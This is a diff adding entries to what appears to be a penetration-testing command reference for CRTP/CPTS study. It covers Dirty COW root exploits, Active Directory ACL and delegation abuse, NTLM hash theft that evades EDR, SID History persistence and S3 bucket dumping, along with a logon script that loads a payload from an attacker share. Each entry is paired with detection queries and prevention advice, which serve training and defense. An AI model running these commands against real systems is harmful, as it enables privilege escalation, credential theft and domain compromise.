+      "notes": "=== AFFECTED KERNELS ===\nLinux kernel 2.x through 4.8.2\nPatched in 4.8.3 (October 2016)\nCheck: uname -r\n\n=== VARIANT 1: /etc/passwd overwrite (most reliable) ===\n  # dirty.c / dirtycow-mem.c\n  gcc -pthread dirty.c -o dirty -lcrypt\n  ./dirty <new_password>\n  # Adds user \"firefart\" with root UID and your password\n  su firefart\n\n=== VARIANT 2: SUID binary replacement ===\n  # cowroot.c - replaces /usr/bin/passwd with a root shell\n  gcc -pthread cowroot.c -o cowroot\n  ./cowroot\n\n=== VARIANT 3: Write to arbitrary file ===\n  # pokemon.c - write arbitrary content to any file\n  gcc -pthread pokemon.c -o pokemon\n  ./pokemon <target_file>\n\n=== STABILITY WARNING ===\nDirty COW exploits a kernel race condition. They can:\n- Crash the kernel (panic)\n- Corrupt memory\n- Hang the system\nAlways try the /etc/passwd variant first - its most stable.\nDo NOT use in production without explicit authorization.\n\n=== DOWNLOAD ===\n  # Multiple variants at:\n  # https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs",
+      "examples": [
+        {
+          "label": "Compile and run passwd overwrite variant",
+          "command": "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty NewRootPass123"
+        },
+        {
+          "label": "Check kernel version for vulnerability",
+          "command": "uname -r"
+        },
+        {
+          "label": "SUID binary replacement variant",
+          "command": "gcc -pthread cowroot.c -o cowroot && ./cowroot"
+        }
+      ],
+      "references": [
+        {
+          "title": "Dirty COW Official Site",
+          "url": "https://dirtycow.ninja/"
+        },
+        {
+          "title": "CVE-2016-5195",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"
+        },
+        {
+          "title": "MITRE T1068 - Exploitation for Privilege Escalation",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "linux-exploit-suggester",
+          "note": "LES identifies Dirty COW among other kernel exploits.",
+          "rel": "prereq"
+        },
+        {
+          "id": "dirty-pipe",
+          "note": "DirtyPipe is the modern successor to DirtyCOW (kernel 5.8+).",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "A race condition between the madvise(MADV_DONTNEED) and write system calls allows a non-privileged process to modify read-only memory mappings, including files owned by root.",
+        "prerequisites": "Linux kernel 2.x-4.8.2; ability to compile and execute code on the target.",
+        "impact": "Root privilege escalation by overwriting /etc/passwd or replacing SUID binaries.",
+        "detection": "[MITRE T1068] Compilation activity (gcc); /etc/passwd modification; unexpected SUID changes.",
+        "artifacts": "File modification of /etc/passwd; new user \"firefart\"; gcc compilation; core dumps from race condition.",
+        "splunk_spl": "index=linux sourcetype=linux_audit (key=\"passwd_changes\" OR key=\"suid_changes\" OR (syscall=\"execve\" AND exe=\"/usr/bin/gcc\"))\n| table _time, host, auid, key, exe",
+        "elastic_kql": "auditd.log.key:(\"passwd_changes\" OR \"suid_changes\") OR process.name:\"gcc\"",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has \"/etc/passwd\" or (ProcessName == \"gcc\" and SyslogMessage has \"-pthread\")\n| project TimeGenerated, HostName, ProcessName, SyslogMessage",
+        "sigma_rules": "linux_dirtycow_exploitation_indicators",
+        "prevention": "Patch kernel to 4.8.3+; remove compiler (gcc) from production systems; monitor /etc/passwd integrity; use SELinux/AppArmor.",
+        "sources": [
+          "CVE-2016-5195",
+          "https://attack.mitre.org/techniques/T1068/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Dirty COW exploitation indicators",
+            "logic": "title: Dirty COW Kernel Exploit Indicators\nstatus: experimental\nlogsource:\n  product: linux\n  service: auditd\ndetection:\n  selection_compile:\n    key: software_mgmt\n    exe|endswith: /gcc\n    a0|contains: -pthread\n  selection_passwd:\n    key: passwd_changes\n    nametype: NORMAL\n  condition: selection_compile or selection_passwd\nlevel: critical",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate compilation on development systems; authorized password changes",
+            "tuning": "Critical alert on production systems; reduce to high on dev systems"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -50468,6 +51066,108 @@ const COMMAND_DATA = {
       "explain": "Adds a principal you control into a group you have GenericAll/GenericWrite/AddMember over, inheriting the group's rights:\n  --host <dc_ip>            the Domain Controller\n  -d <domain>              the domain\n  -u <user> -p <password>  authenticate as the account holding the write right\n  add groupMember \"<target_group>\" <user>   put <user> into <target_group>\nRe-authenticate (new ticket) afterward so the added membership appears in your Kerberos PAC and the inherited privileges take effect."
     },
     {
+      "id": "ad-genericwrite-abuse",
+      "name": "GenericWrite Abuse - Targeted Kerberoast/Shadow Creds/Logon Script",
+      "command": "Set-DomainObject -Identity <target_account> -Set @{serviceprincipalname=\"fake/spn\"} -Verbose",
+      "description": "GenericWrite permission allows modifying non-protected attributes on an AD object. For user objects, this enables targeted Kerberoasting (set SPN), logon script injection (scriptPath), or Shadow Credentials (msDS-KeyCredentialLink). For computer objects, it enables RBCD setup. GenericWrite is one of the most common and dangerous ACL misconfigurations in AD.",
+      "platform": "windows",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ACL Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP ACL abuse module; BloodHound edge documentation",
+      "tags": [
+        "genericwrite",
+        "acl-abuse",
+        "targeted-kerberoast",
+        "shadow-credentials",
+        "logon-script",
+        "spn-jacking"
+      ],
+      "mitre": [
+        "T1558.003",
+        "T1222.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== ABUSE PATH 1: TARGETED KERBEROAST ===\n  # Set a fake SPN on the target user\n  Set-DomainObject -Identity <target_account> -Set @{serviceprincipalname=\"fake/spn\"} -Verbose\n  # Kerberoast the user\n  Rubeus.exe kerberoast /user:<target_account> /nowrap\n  # Clean up\n  Set-DomainObject -Identity <target_account> -Clear serviceprincipalname -Verbose\n\n=== ABUSE PATH 2: SHADOW CREDENTIALS ===\n  # Add key credential link\n  Whisker.exe add /target:<target_account>\n  # Or with pywhisker from Linux:\n  python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target_account> --action add\n  # Authenticate with the generated certificate\n  Rubeus.exe asktgt /user:<target_account> /certificate:<base64_cert> /password:<cert_pass> /ptt\n\n=== ABUSE PATH 3: LOGON SCRIPT ===\n  Set-DomainObject -Identity <target_account> -Set @{scriptpath=\"\\\\<attacker>\\share\\payload.ps1\"}\n  # Executes next time the user logs in\n\n=== ABUSE PATH 4: RBCD (on computer objects) ===\n  Set-ADComputer <target_computer> -PrincipalsAllowedToDelegateToAccount <attacker_computer>$",
+      "examples": [
+        {
+          "label": "Set SPN for targeted Kerberoast",
+          "command": "Set-DomainObject -Identity svc_admin -Set @{serviceprincipalname=\"fake/spn\"} -Verbose"
+        },
+        {
+          "label": "Shadow Credentials with Whisker",
+          "command": "Whisker.exe add /target:svc_admin"
+        },
+        {
+          "label": "Logon script injection",
+          "command": "Set-DomainObject -Identity svc_admin -Set @{scriptpath=\"\\\\attacker\\share\\payload.ps1\"}"
+        }
+      ],
+      "references": [
+        {
+          "title": "BloodHound - GenericWrite Edge",
+          "url": "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"
+        },
+        {
+          "title": "MITRE T1222.001 - File and Directory Permissions Modification",
+          "url": "https://attack.mitre.org/techniques/T1222/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-targeted-kerberoast",
+          "note": "Full targeted Kerberoasting workflow after setting the SPN.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-acl-decision-tree",
+          "note": "Decision tree for choosing the right ACL abuse path.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "GenericWrite allows setting most non-protected attributes. ServicePrincipalName, scriptPath, and msDS-KeyCredentialLink are all writable, enabling multiple attack paths from a single permission.",
+        "prerequisites": "GenericWrite permission on a target user or computer object.",
+        "impact": "Credential theft via Kerberoasting; remote code execution via logon script; impersonation via Shadow Credentials.",
+        "detection": "[MITRE T1558.003] SPN modification on user accounts (Event 5136); scriptPath changes; msDS-KeyCredentialLink modifications.",
+        "artifacts": "Event 5136 (directory service change) for SPN/scriptPath/KeyCredentialLink; Event 4769 for subsequent Kerberoast.",
+        "splunk_spl": "index=windows EventCode=5136 (AttributeLDAPDisplayName=\"servicePrincipalName\" OR AttributeLDAPDisplayName=\"scriptPath\" OR AttributeLDAPDisplayName=\"msDS-KeyCredentialLink\")\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:(\"servicePrincipalName\" OR \"scriptPath\" OR \"msDS-KeyCredentialLink\")",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName in (\"servicePrincipalName\", \"scriptPath\", \"msDS-KeyCredentialLink\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "sigma_rules": "win_security_genericwrite_abuse_spn_script",
+        "prevention": "Audit and remove unnecessary GenericWrite permissions; monitor attribute changes on privileged accounts; use Protected Users group.",
+        "sources": [
+          "CRTP ACL module",
+          "https://attack.mitre.org/techniques/T1558/003/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "GenericWrite abuse - SPN or scriptPath modification",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName in (\"servicePrincipalName\", \"scriptPath\", \"msDS-KeyCredentialLink\")\n| where SubjectUserName !in (\"SYSTEM\", \"Exchange\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1558.003",
+              "T1222.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate SPN management; script deployment via GPO",
+            "tuning": "Whitelist known admin accounts and automation; alert on user-object SPN changes"
+          }
+        ]
+      }
+    },
+    {
       "id": "cdsa-get-winevent",
       "name": "Get-WinEvent - PowerShell Event Log Analysis",
       "command": "Get-WinEvent -FilterHashtable @{LogName='<log>'; ID=<id>} | Select-Object TimeCreated, Id, Message | Format-List",
@@ -64441,6 +65141,103 @@ const COMMAND_DATA = {
         }
       },
       "explain": "An SCF file with an IconFile pointing at your SMB host forces any user who browses the folder to authenticate to you.\nCapture the NTLMv2 hash with Responder and crack it offline.\n=== SCF/LNK File on Share - NTLMv2 Hash Capture ===\nPlace malicious file on file share to capture NTLMv2 hashes when users browse the directory.\n\n=== SCF FILE METHOD ===\nShell Command Files (.scf) ..."
+    },
+    {
+      "id": "ad-internal-monologue",
+      "name": "Internal Monologue - NTLM Hash Extraction Without Touching LSASS",
+      "command": "InternalMonologue.exe -Downgrade True -Restore True -Impersonate True -Verbose True",
+      "description": "Internal Monologue extracts NTLM hashes by triggering local NTLM challenges against logged-in users via the SSPI API, without reading LSASS memory. It forces a NetNTLMv1 downgrade (if possible) to get crackable hashes, or captures NetNTLMv2 hashes. This bypasses credential guard and most EDR detections that monitor LSASS access.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Credential Access",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "eladshamir/Internal-Monologue; CRTP credential access",
+      "tags": [
+        "internal-monologue",
+        "ntlm-hash",
+        "lsass-bypass",
+        "credential-guard-bypass",
+        "sspi",
+        "netntlm"
+      ],
+      "mitre": [
+        "T1003",
+        "T1187"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nInstead of reading LSASS memory (which EDR detects), Internal\nMonologue uses the SSPI API to initiate a local NTLM authentication\nchallenge. The response contains the users hash.\n\n=== RUN ===\n  InternalMonologue.exe -Downgrade True -Restore True -Impersonate True -Verbose True\n  # -Downgrade: Force NTLMv1 (easier to crack)\n  # -Restore: Restore NTLMv1 setting after\n  # -Impersonate: Get hashes for all logged-in users\n\n=== OUTPUT ===\n  # NetNTLMv1 (if downgrade successful):\n  user::domain:challenge:response:response\n  # Crack with hashcat -m 5500\n\n  # NetNTLMv2 (if downgrade blocked):\n  user::domain:challenge:response:response\n  # Crack with hashcat -m 5600\n\n=== WHY ITS STEALTHY ===\n- Does NOT open LSASS process\n- Does NOT inject into LSASS\n- Does NOT touch SAM/SECURITY hives\n- Uses legitimate SSPI API calls\n- Most EDRs dont flag it\n\n=== REQUIREMENTS ===\n- Local admin (for impersonation and NTLMv1 downgrade)\n- Users must be currently logged in\n- Works even with Credential Guard enabled\n\n=== ALTERNATIVE: Inveigh ===\nInveigh can also capture NetNTLMv2 hashes via LLMNR/mDNS poisoning.",
+      "examples": [
+        {
+          "label": "Extract hashes for all logged-in users",
+          "command": "InternalMonologue.exe -Downgrade True -Restore True -Impersonate True -Verbose True"
+        },
+        {
+          "label": "Without NTLMv1 downgrade",
+          "command": "InternalMonologue.exe -Downgrade False -Impersonate True"
+        },
+        {
+          "label": "Crack NetNTLMv1 hash",
+          "command": "hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "Internal Monologue - GitHub",
+          "url": "https://github.com/eladshamir/Internal-Monologue"
+        },
+        {
+          "title": "MITRE T1003 - OS Credential Dumping",
+          "url": "https://attack.mitre.org/techniques/T1003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-inveigh-ps",
+          "note": "Inveigh captures hashes via network poisoning; Internal Monologue via local SSPI.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The Windows SSPI API allows local processes to initiate NTLM authentication challenges. By impersonating logged-in users and triggering local challenges, their NTLM hashes can be extracted without accessing LSASS memory.",
+        "prerequisites": "Local admin on the target machine; users must be logged in.",
+        "impact": "NTLM hash extraction for all logged-in users; enables offline cracking or pass-the-hash.",
+        "detection": "[MITRE T1003] NTLMv1 downgrade (LmCompatibilityLevel change); unusual SSPI authentication events; registry modifications.",
+        "artifacts": "Registry change to LmCompatibilityLevel; NTLM authentication events; token impersonation.",
+        "splunk_spl": "index=sysmon EventCode=13 TargetObject=\"*\\Control\\Lsa\\LmCompatibilityLevel\"\n| table _time, Image, TargetObject, Details",
+        "elastic_kql": "event.code:\"13\" AND registry.path:*LmCompatibilityLevel*",
+        "sentinel_kql": "SysmonEvent\n| where EventID == 13\n| where RegistryKey has \"LmCompatibilityLevel\"\n| project TimeGenerated, Image, RegistryKey, RegistryValue",
+        "sigma_rules": "sysmon_registry_ntlmv1_downgrade",
+        "prevention": "Enforce NTLMv2-only via GPO (LmCompatibilityLevel=5); disable NTLM entirely where possible; monitor for LmCompatibilityLevel changes; use Credential Guard.",
+        "sources": [
+          "CRTP credential access",
+          "https://attack.mitre.org/techniques/T1003/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "NTLMv1 downgrade for Internal Monologue",
+            "logic": "SysmonEvent\n| where EventID == 13\n| where RegistryKey has \"LmCompatibilityLevel\"\n| where RegistryValue in (\"0\", \"1\", \"2\")\n| project TimeGenerated, Computer, Image, RegistryKey, RegistryValue",
+            "data_source": "sysmon",
+            "log_ids": [
+              "13"
+            ],
+            "attack": [
+              "T1003",
+              "T1187"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legacy application compatibility changes; Group Policy updates",
+            "tuning": "Alert on any LmCompatibilityLevel change below 3; correlate with token impersonation events"
+          }
+        ]
+      }
     },
     {
       "id": "ad-inveigh-cs",
@@ -131465,6 +132262,204 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "cloud-s3scanner",
+      "name": "s3scanner - S3 Bucket Permission Auditor",
+      "command": "s3scanner scan --buckets-file buckets.txt",
+      "description": "s3scanner discovers and audits S3 bucket permissions. It checks for public read, public write, and authenticated read/write on bucket and object ACLs. Finds exposed data, backup files, credentials, and source code in misconfigured buckets. Works against AWS S3, DigitalOcean Spaces, and any S3-compatible service.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "AWS Enumeration",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "sa7mon/s3scanner; cloud pentest methodology",
+      "tags": [
+        "s3scanner",
+        "aws",
+        "s3",
+        "bucket",
+        "cloud-enum",
+        "data-exposure",
+        "misconfiguration"
+      ],
+      "mitre": [
+        "T1530"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  pip3 install s3scanner\n  # Or: go install github.com/sa7mon/S3Scanner@latest\n\n=== SCAN BUCKET LIST ===\n  s3scanner scan --buckets-file buckets.txt\n  # Checks existence, permissions, and lists objects\n\n=== GENERATE BUCKET NAMES ===\n  # Common patterns:\n  echo \"company-backup\" >> buckets.txt\n  echo \"company-dev\" >> buckets.txt\n  echo \"company-staging\" >> buckets.txt\n  echo \"company-assets\" >> buckets.txt\n  echo \"company-uploads\" >> buckets.txt\n\n=== DUMP BUCKET CONTENTS ===\n  s3scanner dump --bucket <bucket_name> --output-dir loot/\n\n=== AWS CLI ALTERNATIVE ===\n  # List bucket (no auth needed if public)\n  aws s3 ls s3://<bucket_name> --no-sign-request\n  # Download everything\n  aws s3 sync s3://<bucket_name> ./loot/ --no-sign-request\n  # Check bucket policy\n  aws s3api get-bucket-policy --bucket <bucket_name> --no-sign-request\n\n=== WHAT TO LOOK FOR ===\n- .env files, .git directories\n- Database backups (.sql, .bak)\n- Credentials and API keys\n- Source code archives\n- Customer PII / sensitive data\n- CloudFormation/Terraform state files",
+      "examples": [
+        {
+          "label": "Scan bucket list for permissions",
+          "command": "s3scanner scan --buckets-file buckets.txt"
+        },
+        {
+          "label": "Dump public bucket contents",
+          "command": "s3scanner dump --bucket company-backup --output-dir loot/"
+        },
+        {
+          "label": "AWS CLI - list public bucket",
+          "command": "aws s3 ls s3://company-backup --no-sign-request --recursive"
+        }
+      ],
+      "references": [
+        {
+          "title": "s3scanner - GitHub",
+          "url": "https://github.com/sa7mon/S3Scanner"
+        },
+        {
+          "title": "MITRE T1530 - Data from Cloud Storage",
+          "url": "https://attack.mitre.org/techniques/T1530/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "enumerate-iam finds permissions; s3scanner finds exposed buckets.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-prowler-audit",
+          "note": "Prowler checks S3 bucket configuration among many other things.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "S3 buckets can have ACLs that allow public or authenticated access. Many organizations accidentally expose buckets through overly permissive policies, bucket ACLs, or object-level ACLs.",
+        "prerequisites": "Target bucket names (guessed, enumerated, or found in source code/DNS).",
+        "impact": "Data exposure of sensitive files, credentials, backups, and customer data.",
+        "detection": "[MITRE T1530] S3 access logs showing anonymous or unusual access patterns; large data transfer from buckets.",
+        "artifacts": "S3 access logs; CloudTrail S3 data events; large outbound data transfer.",
+        "splunk_spl": "index=aws sourcetype=aws:s3:accesslogs requester=\"-\"\n| stats count by bucket_name, operation, remote_ip\n| where count > 10",
+        "elastic_kql": "cloud.provider:\"aws\" AND event.dataset:\"aws.s3access\" AND user.name:\"-\"",
+        "sentinel_kql": "AWSCloudTrail\n| where EventSource == \"s3.amazonaws.com\"\n| where UserIdentityType == \"AWSAccount\" or UserIdentityType == \"Unknown\"\n| summarize count() by BucketName, EventName, SourceIpAddress",
+        "sigma_rules": "aws_s3_bucket_enumeration",
+        "prevention": "Enable S3 Block Public Access at the account level; use bucket policies with explicit denies; enable S3 access logging; use AWS Config rules for public bucket detection.",
+        "sources": [
+          "Cloud pentest methodology",
+          "https://attack.mitre.org/techniques/T1530/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "S3 bucket enumeration - anonymous access",
+            "logic": "AWSCloudTrail\n| where EventSource == \"s3.amazonaws.com\"\n| where EventName in (\"ListBuckets\", \"ListObjects\", \"GetObject\", \"GetBucketAcl\")\n| where UserIdentityType == \"Unknown\" or UserIdentityAccountId == \"ANONYMOUS\"\n| summarize Operations=dcount(EventName), Objects=count() by SourceIpAddress, BucketName=tostring(parse_json(RequestParameters).bucketName)",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1530"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Public website assets hosted on S3; CDN origin pulls",
+            "tuning": "Whitelist known CDN IPs; focus on non-public buckets"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-s4u2self-abuse",
+      "name": "S4U2Self / S4U2Proxy - Kerberos Delegation Exploitation",
+      "command": "python3 getST.py -spn cifs/<target>.<domain> -impersonate administrator -dc-ip <dc_ip> <domain>/<machine_account>$:<pass>",
+      "description": "S4U2Self (Service-for-User-to-Self) allows a service to obtain a service ticket to itself on behalf of any user. S4U2Proxy then forwards that ticket to another service. Together they enable impersonation through constrained delegation and RBCD. This is the core mechanism behind RBCD attacks, constrained delegation abuse, and several ADCS attack chains.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Delegation Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP delegation module; Impacket getST.py",
+      "tags": [
+        "s4u2self",
+        "s4u2proxy",
+        "delegation",
+        "impersonation",
+        "rbcd",
+        "constrained-delegation",
+        "kerberos"
+      ],
+      "mitre": [
+        "T1550.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE MECHANISM ===\nS4U2Self: \"I am service X, give me a ticket to myself for user Y\"\nS4U2Proxy: \"I have a ticket for user Y to me, give me a ticket for Y to service Z\"\n\nThis only works when:\n1. The requesting account is allowed to delegate to the target service\n2. The impersonated user is not in Protected Users or marked sensitive\n\n=== RBCD CHAIN (most common) ===\n  # 1. Set up RBCD\n  python3 rbcd.py -delegate-from FAKE01$ -delegate-to <target>$ -action write <domain>/<user>:<pass>\n  # 2. S4U2Self+S4U2Proxy\n  python3 getST.py -spn cifs/<target>.<domain> -impersonate administrator -dc-ip <dc_ip> <domain>/FAKE01$:Password123\n  # 3. Use the ticket\n  export KRB5CCNAME=administrator.ccache\n  python3 psexec.py -k -no-pass <domain>/administrator@<target>.<domain>\n\n=== CONSTRAINED DELEGATION ===\n  # If a service has constrained delegation to another service:\n  python3 getST.py -spn <allowed_spn> -impersonate administrator <domain>/<service_account>:<pass>\n  # Alternative SPN (-altservice) works because the SPN in the ticket is not validated:\n  python3 getST.py -spn <allowed_spn> -impersonate administrator -altservice cifs/<target> <domain>/<service_account>:<pass>\n\n=== RUBEUS (WINDOWS) ===\n  Rubeus.exe s4u /user:<machine>$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt\n  # With alternative service:\n  Rubeus.exe s4u /user:<machine>$ /rc4:<hash> /impersonateuser:administrator /msdsspn:time/<target> /altservice:cifs/<target> /ptt",
+      "examples": [
+        {
+          "label": "S4U impersonation via RBCD",
+          "command": "python3 getST.py -spn cifs/target.corp.local -impersonate administrator -dc-ip 192.168.1.10 corp.local/FAKE01$:Password123"
+        },
+        {
+          "label": "Constrained delegation with alt service",
+          "command": "python3 getST.py -spn time/target.corp.local -impersonate administrator -altservice cifs/target.corp.local corp.local/svc_sql:Password123"
+        },
+        {
+          "label": "Rubeus S4U with ticket injection",
+          "command": "Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt"
+        }
+      ],
+      "references": [
+        {
+          "title": "Impacket getST.py",
+          "url": "https://github.com/fortra/impacket"
+        },
+        {
+          "title": "MITRE T1550.003 - Use Alternate Authentication Material",
+          "url": "https://attack.mitre.org/techniques/T1550/003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-addcomputer",
+          "note": "Create the machine account needed for RBCD before S4U.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-impacket-rbcd",
+          "note": "Set up RBCD delegation before using S4U to impersonate.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "S4U2Self is a legitimate Kerberos protocol extension that allows services to request tickets on behalf of users. The DC trusts the delegation configuration and issues tickets for the impersonated user.",
+        "prerequisites": "Control of an account with delegation rights (constrained delegation or RBCD); target user not in Protected Users.",
+        "impact": "Full impersonation of any domain user (including admin) to the delegated service.",
+        "detection": "[MITRE T1550.003] Event 4769 (TGS request) with delegation flags; S4U2Self/S4U2Proxy ticket requests from unusual sources.",
+        "artifacts": "Event 4769 with TransitedServices field; Kerberos tickets with delegation flags; unusual service-to-service authentication.",
+        "splunk_spl": "index=windows EventCode=4769 TransitedServices!=\"\"\n| table _time, TargetUserName, ServiceName, IpAddress, TransitedServices",
+        "elastic_kql": "event.code:\"4769\" AND winlog.event_data.TransitedServices:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| where TransitedServices != \"\"\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TransitedServices",
+        "sigma_rules": "win_security_s4u_delegation_abuse",
+        "prevention": "Add sensitive accounts to Protected Users; set \"Account is sensitive and cannot be delegated\"; use RBCD instead of unconstrained delegation; monitor delegation configuration changes.",
+        "sources": [
+          "CRTP delegation module",
+          "https://attack.mitre.org/techniques/T1550/003/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "S4U2Self/S4U2Proxy delegation exploitation",
+            "logic": "SecurityEvent\n| where EventID == 4769\n| where TransitedServices != \"\"\n| where TargetUserName has \"administrator\" or TargetUserName has \"admin\"\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TransitedServices",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4769"
+            ],
+            "attack": [
+              "T1550.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate constrained delegation (e.g., IIS to SQL); front-end/back-end service chains",
+            "tuning": "Baseline normal delegation patterns; alert on admin impersonation through delegation"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-sapphire-ticket",
       "name": "Sapphire Ticket - Hybrid Diamond Ticket with S4U2Self",
       "command": "Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:<dc_ip> /ticketuserid:500 /groups:512",
@@ -136482,6 +137477,107 @@ const COMMAND_DATA = {
         "antivirus"
       ],
       "explain": "Shellter is a dynamic PE infector that injects shellcode into a legitimate Windows 32-bit executable, making it appear as a normal program while executing a payload.:\n  shellter\nRun shellter on Kali (via wine) or on a Windows host."
+    },
+    {
+      "id": "ad-sid-history-persistence",
+      "name": "SID History Injection - Cross-Domain Persistence",
+      "command": "mimikatz# sid::add /sam:TargetUser /new:S-1-5-21-<parent_domain_sid>-519",
+      "description": "SID History injection adds the SID of a privileged group (e.g., Enterprise Admins S-...-519) from a parent domain into a user account in a child domain. The injected SID is included in the users Kerberos ticket, granting them access to resources in the parent domain without being a member of those groups. Survives password resets.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Domain Persistence",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP cross-domain module; mimikatz sid::add",
+      "tags": [
+        "sid-history",
+        "persistence",
+        "cross-domain",
+        "enterprise-admins",
+        "mimikatz",
+        "trust-abuse"
+      ],
+      "mitre": [
+        "T1134.005"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nSID History was designed for domain migrations - when a user moves\nfrom Domain A to Domain B, their old SID is preserved in SIDHistory\nso they keep access to old resources. Attackers abuse this to inject\nprivileged SIDs from a parent domain into child domain accounts.\n\n=== INJECT WITH MIMIKATZ ===\n  # Requires DA on the child domain + patching NTDS\n  mimikatz# privilege::debug\n  mimikatz# sid::patch\n  mimikatz# sid::add /sam:TargetUser /new:S-1-5-21-<parent_EA_sid>-519\n  # 519 = Enterprise Admins\n\n=== INJECT VIA GOLDEN TICKET ===\n  # Alternative: include SID in a forged ticket\n  mimikatz# kerberos::golden /user:TargetUser /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-<parent_EA_sid>-519 /ptt\n\n=== VERIFY ===\n  # Check SID History on the account:\n  Get-ADUser TargetUser -Properties SIDHistory | Select SIDHistory\n  # The user now has EA privileges when accessing parent domain resources\n\n=== WHY ITS POWERFUL ===\n- Survives password resets\n- Not visible in standard group membership queries\n- Works across domain boundaries within the forest\n- The SID is embedded in the Kerberos PAC",
+      "examples": [
+        {
+          "label": "Inject Enterprise Admin SID into user",
+          "command": "mimikatz# sid::add /sam:TargetUser /new:S-1-5-21-<parent_EA_sid>-519"
+        },
+        {
+          "label": "Include SID in Golden Ticket",
+          "command": "mimikatz# kerberos::golden /user:TargetUser /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-<parent_EA_sid>-519 /ptt"
+        },
+        {
+          "label": "Check SID History on account",
+          "command": "Get-ADUser TargetUser -Properties SIDHistory | Select SIDHistory"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1134.005 - SID-History Injection",
+          "url": "https://attack.mitre.org/techniques/T1134/005/"
+        },
+        {
+          "title": "ADSecurity - SID History Persistence",
+          "url": "https://adsecurity.org/?p=1772"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-dcshadow",
+          "note": "DCShadow can inject SID History stealthily via replication.",
+          "rel": "alternative"
+        },
